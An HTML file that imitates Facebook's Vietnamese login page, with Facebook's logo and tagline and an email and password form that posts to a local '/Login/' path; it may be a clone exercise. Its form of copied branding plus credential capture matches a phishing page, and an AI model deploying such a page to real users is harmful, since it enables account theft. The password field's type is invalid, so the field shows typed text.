<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trang chủ</title>
    <link rel="stylesheet" href="login.css">
</head>

<body>
    <div class="main">
        <div class="container">
            <div class="logo">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
            </div>
            <h2>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
        </div>
        <div class="content">
            <form action="/Login/" method="POST" class="form">
                <div class="set">
                    <div>
                        <div class="lux">
                            <input id="Email hoặc số điện thoại" type="text" placeholder="Email hoặc số điện thoại"
                                name="Email hoặc số điện thoại" required>
                        </div>
                        <div class="lux">
                            <input id="Mật khẩu" type="Mật khẩu" placeholder="Mật khẩu" name="Mật khẩu" required>
                        </div>
                    </div>
                    <div>
                        <button type="submit" class="login"><b>Đăng nhập</b></button>
                    </div>
                    <div class="luthor">
                        <a href="#">Quên mật khẩu?</a>
                    </div>
                    <div id="muts"></div>
                    <div class="mod">
                        <br>
                        <a href="register.html" class="new"><b>Tạo tài khoản mới</b></a>
                    </div>
                </div>
                <div class="page">
                    <a href="#" class="_page"><b>Tạo Trang</b></a>
                    dành cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.
                </div>
            </form>
        </div>
    </div>
</body>

</html>
